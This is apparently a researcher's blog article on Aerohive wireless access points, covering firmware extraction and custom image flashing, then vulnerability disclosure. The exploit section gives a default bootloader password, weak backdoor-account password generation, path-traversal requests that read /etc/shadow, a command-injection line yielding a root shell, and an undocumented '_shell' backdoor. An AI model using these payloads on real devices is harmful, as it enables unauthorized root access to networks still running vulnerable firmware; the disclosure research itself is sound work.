---
layout: article
title: "Hacking the Hive: Discovering Vulnerabilities in Aerohive Devices"
author: Jordan Smith
image:
  teaser: aerohive/AerohiveLogo.png
tags: [IoT, Aerohive, Exploits]
excerpt: "Learn how to write your own firmware for aerohive devices! With a bonus side order of some remote code execution!"
---

{% include toc.html %}

# 1. Overview & Background
Aerohive are a manufacturer of enterprise wireless networking equipment.
 
To steal the description straight from Wikipedia:
> Aerohive Networks was an American multinational computer networking equipment company headquartered in Milpitas, California, with 17 additional offices worldwide. The company was founded in 2006 and provided wireless networking to medium-sized and larger businesses.
 
They've since been acquired by ExtremeNetworks.
 
 
Typically you'll see their devices hanging from the ceiling and generally looking like a wireless access point, personally I've seen them around quite a bit on commercial premises and they seem to be especially popular in schools.

<p align="center">
  <img width="50%" src="/images/aerohive/ap130.jpeg" />
</p>


Now, my interest in these devices comes from me looking at my shitty home Dlink DAP-1665 access point and realising that not only can I not update the darn thing. It also only supports WPA2 TKIP. Which for those of you in the [know](https://en.wikipedia.org/wiki/Temporal_Key_Integrity_Protocol) is based off of RC4, a horribly broken stream cipher used in WEP. 
Ramble aside. I needed a new access point. Looking on trademe (ebay for our american folks) it became pretty clear that people just rip these aerohive devices out of old offices then have literally no idea what to do with them so you can pick them up pretty cheap. 

Thus I went, laid down some cold hard cash and got my hands on an AP130, and of course was then promptly was given two AP230. By a friend. For free. 

Financial sadness aside. What's the number one thing that you want to know when you get a new wireless access point? Throughput? Range? Does it support 5G? 
All of these metrics are scams. The most important questions are, does it run linux? and if so can I run my own software on it. 
 
So in a quest to run and write my own software on these devices I had to exploit them! It was a need, not a want. 
 
And here we are. Exploiting. 
 
It's worth pointing out that this will go into some of the custom tools and the process I went through to write new images for these devices.
If you're not into that you can skip the rambling, by jumping straight to "how hack" section or even "Tools" if you really don't want to read.

# 2. Tested devices

At my disposal I had: 
- AP230
- AP130
- AP330 (By proxy)

However I am fairly certain that any device that runs HiveOS (renamed ExtremeCloudIQ) is vulnerable to these attacks albeit perhaps with some modifications.

# 3. Hardware, Firmware, Software Development

This section will be primarily focused on the AP230, as I chose to use those in my home network. 
Device layouts and offsets will be different for other devices and may require you to do a bit of work yourself to work those out. 

Hopefully this gives you enough information to do so.

(Yes, you will need to use some exploits to start doing this)

## Serial Interface

These devices do serial over ethernet which you can connect to via screen and have a baudrate of 9600. 

```bash
screen /dev/ttyUSB0 9600
```

The bootloader has a default password of `AhNf?d@ta06` and runs uboot.

## CPU Architecture

To even begin approaching the idea of writing our own software for these devices we've got to find out which instruction set they use. 

```bash
cat /proc/cpuinfo
processor	: 0
model name	: ARMv7 Processor rev 0 (v7l)
BogoMIPS	: 1990.65
Features	: swp half thumb fastmult edsp tls
CPU implementer	: 0x41
CPU architecture: 7
CPU variant	: 0x3
CPU part	: 0xc09
CPU revision	: 0

processor	: 1
model name	: ARMv7 Processor rev 0 (v7l)
BogoMIPS	: 1990.65
Features	: swp half thumb fastmult edsp tls
CPU implementer	: 0x41
CPU architecture: 7
CPU variant	: 0x3
CPU part	: 0xc09
CPU revision	: 0

Hardware	: BCM94708
Revision	: 0000
Serial		: 0000000000000000
```

As we can see here they use ARMv7 for the AP230, which we can get a cross compiler using [crosstools-ng](https://crosstool-ng.github.io/). 
I used the menu config to select for ARMv7 and kernel version `3.16`. You will need to edit the generated config file in order to select the exact kernel version. 


In my case for my AP230, I did the following:
```bash
CT_LINUX_VERSION="3.16.36"
```

## Getting Familiar with NAND

We have to get an understanding of the devices NAND layout if we ever want to write something to it. 
Luckily we can do this by reading `/proc/mtd` which also comes with fancy partition labels which help us later.

```bash
Cubenet4D-AP2:/tmp/root# cat /proc/mtd
dev:    size   erasesize  name
mtd0: 00400000 00020000 "Uboot"
mtd1: 00040000 00020000 "Uboot Env"
mtd2: 00040000 00020000 "nvram"
mtd3: 00060000 00020000 "Boot Info"
mtd4: 00060000 00020000 "Static Boot Info"
mtd5: 00040000 00020000 "Hardware Info"
mtd6: 00a00000 00020000 "Kernel"
mtd7: 05000000 00020000 "App Image"
mtd8: 1a080000 00020000 "JFFS2"
```

I started off by dumping each individual section using `dd`, to the onboard large storage under the folder `/f/` then pulling it down with `scp`:

```bash

$df
Filesystem                Size      Used Available Use% Mounted on
/dev/root                27.4M     27.4M         0 100% /
devtmpfs                108.0M         0    108.0M   0% /dev
tmpfs                    84.0M      2.1M     81.9M   2% /tmp
/dev/mtdblock8          416.5M     19.7M    396.8M   5% /f

$dd if=/dev/mtd7 of=/f/partname
#On my host machine
$scp ap.home:/f/partname .
```
(Now would also be a really good idea to make a backup of all those partitions.... just in case)

I'll skip the output of me running `binwalk` over every single part and just tell you that `/dev/mtd8` "App Image" was the most useful part as it contains the root filesystem. 
Which I then extracted with `binwalk`:

```bash
binwalk -e AP230-appimage

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             uImage header, header size: 64 bytes, header CRC: 0x1AB77E5F, created: 2019-07-07 15:49:04, image size: 28655616 bytes, Data Address: 0x0, Entry Point: 0x0, data CRC: 0x98020DFC, OS: Linux, CPU: ARM, image type: RAMDisk Image, compression type: none, image name: "uboot initramfs rootfs"
64            0x40            Squashfs filesystem, little endian, version 4.0, compression:xz, size: 28654808 bytes, 5113 inodes, blocksize: 131072 bytes, created: 2019-07-07 15:49:04
41943040      0x2800000       uImage header, header size: 64 bytes, header CRC: 0xB440AEF6, created: 2020-01-10 07:11:32, image size: 28651520 bytes, Data Address: 0x0, Entry Point: 0x0, data CRC: 0xBF8F1BF1, OS: Linux, CPU: ARM, image type: RAMDisk Image, compression type: none, image name: "uboot initramfs rootfs"
41943104      0x2800040       Squashfs filesystem, little endian, version 4.0, compression:xz, size: 28650040 bytes, 5113 inodes, blocksize: 131072 bytes, created: 2020-01-10 07:11:32
```

From here we can see that the device actually has two firmware for the price of one! I can only imagine this is for recovery purposes in case one of the firmware components gets corrupted on the NAND.

### Building an Image

Now that we know our target, we have to overwrite it with something useful. 
After extracting the firmware with `binwalk -e` we get the following structure:

```bash
2800040.squashfs  40.squashfs  squashfs-root  squashfs-root-0
```

As we can see our root filesystem has now been properly extracted.
```bash
ls squashfs-root
bin  dev  etc  etc2  f  home  include  info  lib  lib64  linuxrc  man  opt  proc  root  sbin  share  sys  tftpboot  tmp  usr  var
```
I personally remove the two folders `squashfs-root` and `squashfs-root-0` and use `unsquashfs 40.squashfs` to create folders called `40` and `280040`.
This just helps us note where each firmware will go in the final image, especially helpful when it comes to creating your own recovery firmware! 


So now, if you go into those folders `40` and `280040` you can edit those filesystems to your hearts delight! Writing and embedding your own software to these new filesystems. 
In order to rebuild the AppImage to the correct size, I've written a script to package it all together.

```bash
#!/bin/bash

BASE=$(readlink -f _appimage.extracted)
MAX_SIZE=83886080

mkdir -p build
cd build
rm *

touch appimage_new

mksquashfs $BASE/40 m40.squashfs -comp xz -b 131072 -no-xattrs -all-root -progress -always-use-fragments -no-exports -noappend
mkimage -O Linux -A ARM -T ramdisk -n 'uboot initramfs rootfs' -d m40.squashfs startpart

cat startpart >> appimage_new

SIZE=$(expr 41943040 - $(wc -c startpart | cut -d ' ' -f 1))
echo $SIZE

truncate -s +$SIZE appimage_new

mksquashfs $BASE/2800040 m2800040.squashfs -comp xz -b 131072 -no-xattrs -all-root -progress -always-use-fragments -no-exports -noappend
mkimage -O Linux -A ARM -T ramdisk -n 'uboot initramfs rootfs' -d m2800040.squashfs endpart

cat endpart >> appimage_new

truncate -s +$(expr $MAX_SIZE - $(wc -c appimage_new | cut -d ' ' -f 1)) appimage_new

mv appimage_new ..
```


## Flashing! Its fun!

Now, the most important bit. Actually writing this new AppImage to the device. 
There are multiple ways of doing this. I did however find that `dd` would cause the kernel to panic and die. 

So there are two options, writing while the device is live or using the bootloader.

With both of these methods its **extremely important** to erase the NAND partition before writing it. Otherwise the data just becomes corrupt due to NAND goodness.

```bash
mtd_debug erase /dev/mtd7 83886080
mtd_debug write /dev/mtd7 0 83886080 /f/appimage_new
```

For the bootloader things are slightly different. Where Linux sees the NAND device as these separate MTD devices all neatly packaged the bootloader sees it all as one blob. So we need to calculate the exact offset using the NAND info we found before.

```bash
      size
mtd0: 00400000 00020000 "Uboot"
mtd1: 00040000 00020000 "Uboot Env"
mtd2: 00040000 00020000 "nvram"
mtd3: 00060000 00020000 "Boot Info"
mtd4: 00060000 00020000 "Static Boot Info"
mtd5: 00040000 00020000 "Hardware Info"
mtd6: 00a00000 00020000 "Kernel"
mtd7: 05000000 00020000 "App Image"
```

We just add all the sizes before the appimage:
```
0x00400000+0x00040000*2+0x00060000*2+0x00040000+0x00a00000 =
hex(16252928) = 0xf80000
```

Then rebooting into the flash by connecting our serial adapter and entering the password, `AhNf?d@ta06`.
We then have to do the following steps. 

The easiest way of getting the image onto the device, is by using `dnsmasq` to set up a basic tftp server and hosting the image there. 
The device can then read it entirely into memory, and write it to the NAND.

Dnsmasq config:
```text
enable-tftp
tftp-root=/srv/tftp
```

Uboot commands
```bash
setenv ipaddr 192.168.1.50
setenv serverip 192.168.1.3 
tftpboot 0x81000000 appimage_new

nand erase 0xf80000 0x5000000
nand write 0x81000000 0xf80000 0x5000000
```

After rebooting your device should now be running your very own firmware! (Or, you've broken it, in which case I really hope you backed up your original appimage).

## My Further Work

Personally, I dont want to have to flash my device every single time I want to update something. So I rewrote the firmware to mount an image, and run scripts from said image.
This happens after all the device setup, so we can overwrite changes the device makes it itself during the startup process. 


```bash
#Contents of /etc/init.d/rcS

if [ -f /f/image.sqfs ]; then
	echo -n "Applying custom update"
	mount /f/image.sqfs /update
	if [ -f /update/init.sh ]; then
		/update/init.sh
	fi
	echo "Done"
fi
```

For example my current `/update/init.sh` script does this:
```bash
#!/bin/sh

echo ""
echo "Overwriting configuration files and setting root key"

cp -rf /update/etc/* /tmp/etc
cp -rf /update/root/.ssh /tmp/root
```

Which writes my ssh public keys into the `.ssh/authorized_keys` so I no longer have to use password based authentication. It also upgrades some of the ciphers that OpenSSH uses and updates the OpenSSH version!


## Tools
Now, I said that I wanted to write my own software for this. What better way of writing software than writing your own package manager that uses the cross compiler I've installed and pulls the most recent source from github repositories. 
It also goes to great lengths in order to minimize image size, by only including libraries that are critical to the function of whatever it is compiling.

https://github.com/NHAS/package_manager


Example 'release.json' for package manager.
```json
{
	"oauth_token": "<omitted>",
	"cross_compiler": "arm-unknown-linux-gnueabi",
	"replacements": {
		"build_dir": "/home/nhas/Documents/RouterReversing/tools/openssh/build",
		"ld_loc": "/update/lib",
		"default_path":"/update/bin:/update/sbin:/bin:/sbin"
	},
	"packages": [
		{
			"name":"openssl",
			"repo":"https://github.com/openssl/openssl",
			"configure_opts": "CROSS_COMPILE=$cross_compiler$- ./Configure -DL_ENDIAN --prefix=$build_dir$ linux-armv4",
			"install": "make -j 32 install",
			"tag_regex":"^OpenSSL_"
		},
	 	{
		 	"name":"openssh",
			"repo":"https://github.com/openssh/openssh-portable",
			"configure_opts": "autoreconf; LDFLAGS='-Wl,--rpath=$ld_loc$ -Wl,--dynamic-linker=$ld_loc$/ld-linux.so.3' ./configure --with-default-path=$default_path$ --disable-strip --host=$cross_compiler$ --prefix=$build_dir$ --with-ssl-dir=$build_dir$ --with-zlib=$build_dir$",
			"depends": ["openssl", "zlib"],
			"install": "make install-files",
			"patches":"patches/openssh"
		},
		{
			"name":"zlib",
			"repo":"https://github.com/madler/zlib",
			"configure_opts": "CC=$cross_compiler$-gcc ./configure --prefix=$build_dir$",
			"install": "make -j 32 install"
		}
	],
	"image_settings": {
		"image_name":"release.sqfs",
		"image_config":"image_config",
		"cross_compiler_lib_root": "/home/nhas/x-tools/arm-unknown-linux-gnueabi/arm-unknown-linux-gnueabi/sysroot/lib",
		"executables": [
			"sbin/sshd",
			"bin/ssh",
			"bin/ssh-keygen",
			"bin/scp"
		],
		"ld_library_paths":[
			"build/lib"
		]
	}
}
```


# 4. Vulnerabilities (How hack)

The bit you've all been waiting for, the big cheese. The answer to the question of "If I find an Aerohive device what can I *do*?".  


## Previous work
Now a quick interlude before jumping straight in. It would be disingenuous of me to appear to be the only person working in this area. So another person has found LFI (local file inclusion), and allocated a CVE for it. 

https://github.com/eriknl/CVE-2020-16152

This work is really rather awesome and I encourage you to read their write up, as it is very professional and easy to understand. 

## Broken Authenitcation

Instead of using the builtin php session functionality, Aerohive have opted for a very strange approach to authentication.  
Essentially, if the file `/tmp/php_session_file` exists and isnt empty, then it is possible to instantiate any php class under the `webui/action` folder in the web root.  
This file is created on login of any user to the device. So the moment someone logs in they hand over the keys to the castle. 


action.php5
```php
<?php
ob_start();
require_once 'AhController.class.php5';
AhController::execute();
?>
```


AhController.php5
```php
public static function execute($pageName=null, $actionName=null,$actionType=null)
{
    $sessionId = AerohiveUtils::read_file(ConstCommon::PHP_SESSION_ID_FILE);
    if(!empty($sessionId))
    {
        if($_REQUEST['_page']=='SessionFile'){
            $bln=AerohiveUtils::isTimeout(false);
            $result='false';
            if($bln)
                $result='true';
                echo json_encode($result);
            } else {
                $ctrl = new AhController();
                $ctrl->run($pageName, $actionName,$actionType);

            }

    }
}
```

Constants
```php
    const PHP_SESSION_FILE='/tmp/php_session_file';
```

login.php5
```php
AerohiveUtils::write_file(ConstCommon::PHP_SESSION_FILE,$content);
```

However. That check only happens on the most recent firmware (10.0r8 is what I have)  examining older versions such as 6.6 shows this check just does not happen. Which means you'll be able to execute any PHP class under `webui/action` regardless if someone has logged in or not.

AhController.php5 on the old firmware.
```php
public static function execute($pageName=null, $actionName=null,$actionType=null)
        {
                if($_REQUEST['_page']=='SessionFile'){
                        $bln=AerohiveUtils::isTimeout(false);
                        $result='false';
                        if($bln)
                        $result='true';
                        echo json_encode($result);
                }
                else{

                $ctrl = new AhController();
                $ctrl->run($pageName, $actionName,$actionType);

                }

        }
```

This vulnerability is the lynchpin of the other web based vulnerabilities as the php classes have numerous vulnerabilities that allow everything from remote file read, user creation, firmware upgrades. If only you look hard enough.


## Weak Service Account Password Generation
Decompiling the executables that run at startup on these devices, I stumbled upon two services that add 'service' (see backdoor) users to the `/etc/shadow` file. 
These users are called `AerohiveHiveCommadmin` and `AerohiveHiveUIadmin`.  
  
The passwords are generated using a weak algorithm.  
  
1. Get the current time microseconds (e.g a number between 0 -> 1000000)
2. Get the last 6 digits of the device management interface MAC address and swap the middle two digits with the first. Eg 8e:00:00, becomes 00:8e:00
3. Concat mac+mircoseconds as a string, and hash it with md5crypt and no salt.
  
Done!

Exploiting this has two routes. The first bruteforcing the openssh server, which is not efficient due to only being allowed 10 open unauthenticated connections at any time, and the delay per each authorisation. If you've got nothing else and have to do this it is possible but still a pain. 
(Also worth nothing that on my AP230 the microsecond value has a 68% likelihood to be below 500000. Not sure why however). 

The second is to leak the values elsewhere such as a remote file read.

Also here is a [Ghidra](https://ghidra-sre.org/) decompilation of the account password generation:

```c
    gettimeofday(&tStack60,(__timezone_ptr_t)&tStack68);
    ah_dcd_get_mac_byname(&DAT_000456ec,&local_34);
    ah_snprintf(&DAT_0006452c,0x20,"%02x%02x%02x%d",(undefined)local_30,local_34 >> 0x18,
                local_30._1_1_,tStack60.tv_usec); // Get the current microseconds
    if ((DAT_0006452c & 0xff) == 0) { // Default value set here if for whatever reason the generation fails (Most probably 'aerohive')
      DAT_0006452c = 0x6f726561;
      DAT_00064530 = 0x65766968;
                    /* WARNING: Ignoring partial resolution of indirect */
      DAT_00064534._0_1_ = 0;
    }
    iVar1 = ah_passwd_crypt("AerohiveHiveCommadmin",&DAT_0006452c,0); // Adds to the /etc/shadow file 
    if (iVar1 < 0) {
      ah_log(9,3,"capwap HiveComm crypt scp password failed.\n");
    }
```

### Remote File Read

There are at least two remote file reads! One was fortunately (unfortunately? depending on your point of view) 'patched' in later versions but still worth knowing about.  
I initially had older firmware, so found a working file read in order to take advantage of the poorly generated passwords shown in section X.
This was patched in the later versions of the firmware. However, there was another easy file read that was found. 

### Old Firmware

The old firmware has an arbitrary file read in the `action/BackupAction.class.php5` class, which is shown in detail below. 

Proof of concept: 
```
POST /action.php5?_page=Backup&_action=get&name=bloop&debug=true HTTP/1.1
Host: 192.168.1.1
Content-Type: application/x-www-form-urlencoded

mac=../../../etc/shadow%00
```

So how does this work? Get triggers the `downloadConfigFile()` function to run as shown below:

```php
public function process() {
                AhLogger::getInstance()->info("BackupAction.process called. actionName={$this->actionName}");
                if ($this->actionName == 'list') {
                        $this->listConfigFiles();
                } else if ($this->actionName == 'get') {
                        $this->downloadConfigFile();
                } else if ($this->actionName == 'check') {
                        $this->checkConfigFile();
                }
        }
```

In the `downloadConfigFile()` we control the `mac` and `name`, and the file that is to be read is the string `$dir` which is just the `mac` prefixed with a static value, with `.config` appended to it.
```php
 private function downloadConfigFile() {
                $dir = $this->config_dir;
                $mac = $this->params->get('mac');
                $name = $this->params->get('name');
                $outFilename = $name.'.conf';
                $allFilename = 'hiveui_conf.tar';

                $dir = $dir.$mac.'.conf'; // Conf added as a suffix

```

We set `name` to bloop to not enter the first if block and reach the `readfile` function. 

```php
if($name=='All'){

} else {

    if mac == serverMac {
        <omit>
    } else {
        if (file_exists($dir)) {
            <omit>
            readfile($dir); // Target
            exit;
        } else {
            AhLogger::getInstance()->warn('config file not found:'.$dir);
        }
    }

}
```

When looking through the frontend code this request done with the GET method, however that doesnt allow the insertion of a null byte. 
But you can convert it to a POST for some reason, and then you get to use the null byte attack `%00` to remove the `.conf` suffix. From this point you can easily use directory traversal to read the `/etc/shadow` file, and crack the passwords to gain device access.
   
This method was then patched by the addition of: 

```php
if(strpos($mac,'../') !== false) {
    AhLogger::getInstance()->error('invalid file path not allowed:'.$mac);
    return;
}
```

Luckily for me a new method was found.

### New Firmware

This uses the `action/ActiveAPDetailInfoWebUIAction.class.php5` class, which is also file read, but less simple to the naked eye. Hence why it wasnt immediately "patched" unlike our other vulnerability. 


Proof of concept: 
```
POST /action.php5?_page=ActiveAPDetailInfoWebUI&_action=get&_dc=10000
Host: 192.168.1.1
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=a

macAddr=../../../etc/shadow%00
```


The following source is what lets this occur. 
```php
public function process() {
    AhLogger::getInstance()->info("ActiveAPDetailInfoAction.process called. actionName={$this->actionName}");

    if ($this->actionName == 'get') {
        $mac=$this->user->getMac();
        $mac=AerohiveUtils::macAddrToStr($mac);
        $mac=str_replace('-',':',$mac);
        AhLogger::getInstance()->info(' mac ='.$mac);
        $mac_ap=$_REQUEST['macAddr'];                                 // We control this!
        $mac_ap=str_replace('-',':',$mac_ap);
        AhLogger::getInstance()->info(' mac of ap ='.$mac_ap);

        $webui_file_dir=ConstCommon::BASIC_FILE_DIR.$mac.'.conf';
        $ap_file_dir=ConstCommon::BASIC_FILE_DIR.$mac_ap.'.conf';     // Which means we control this!

        AhLogger::getInstance()->info(' file dir ='.$webui_file_dir.' and '.$ap_file_dir.' isMgtAP = '.$_REQUEST['isMgtAP']);

        $this->readFileContents($webui_file_dir);
        $this->readFileContents($ap_file_dir); //And thus, all your files are belong to us
        if(intval($_REQUEST['isMgtAP'])){
            $webui_wizard_dir=ConstCommon::WIZARD_CONFIG_PATCH.'.conf';
            $this->readFileContents($webui_wizard_dir);     
        }
    } 

```

The same technique applies, get rid of the `.conf` using a good ol' null byte and then you're away!


Using either of these techniques immediately allows an attacker to escalate to device access, which is effectively root. As you can crack the md5crypt passwords in `/etc/shadow` get shell. As mentioned in the previous issues.

## Restricted Shell RCE

To take a break from all this web stuff, the exploit which I used to start exploring the device is a simple command injection.

Essentially you can inject shell commands into a "save web-page" command. Which seems to use curl/scp to download web pages. I believe this is for putting up a captive portal type of thing (Which may allow you to just drop a php shell on here, but meh).

```bash
save web-page web-directory test scp://root@192.168.1.1:/etc/shadow$(sh)\n
```

As the `ah_cli_ui` program, which provides the restricted shell interface runs as root, this gives the user immediate root access. 

## Backdoor _shell functionality

Finally, If you some how have access to an aerohive shell, there is an undocumented magic backdoor that will give you instant root if you know the a magic password.
Unfortunately (or fortunately depending on your point of view) this password changes per platform and I only had access to an AP130 and AP230. 

The magic shell command is `_shell`.

And for your convenience a tool to generate passwords for the AP130 and AP230 (https://github.com/NHAS/aerohive-keygen).


## Tools (TL;DR give automated hack tool)

TL;DR you can hack aerohive pretty good, here are the tools to do that.


Putting these vulnerabilities together, I've made a tool that'll effectively give you instant root on these devices. 

Remote code execution through arbitrary file read and weak password generation (firmware version < 10.0r8):
https://github.com/NHAS/aerohive-autoroot

Magic shell password generator for AP130 and AP230: 
https://github.com/NHAS/aerohive-keygen


# 5. Conclusion

While doing this research, the vendor has upgraded their most recent devices to use a more recent version of PHP which stops null bytes from truncating strings. 
The large majority of aerohive devices are still vulnerable, but the vendor has shown initiative in patching these vulnerabilities. 

There were a number of oddities that I didnt feel fit into this article. Such as, iptables not being functional and the fact that any user on the device is root regardless of actual permissions.
But these issues raised are more than enough


## Future Research

Some ideas that other people could carry on if they wanted to:

- The devices use a proprietary communications method for their "HiveManager" software, fully understanding the decompiled source code of the onboard custom software has been something I havent made a lot of headway with. But if the PHP written for the web interface is any indication, it should have some fairly fun bugs. 

- Decompiling the proprietary kernel modules or obtaining source, so that the kernel itself can be updated. As currently they're stuck on version `3.13.x`
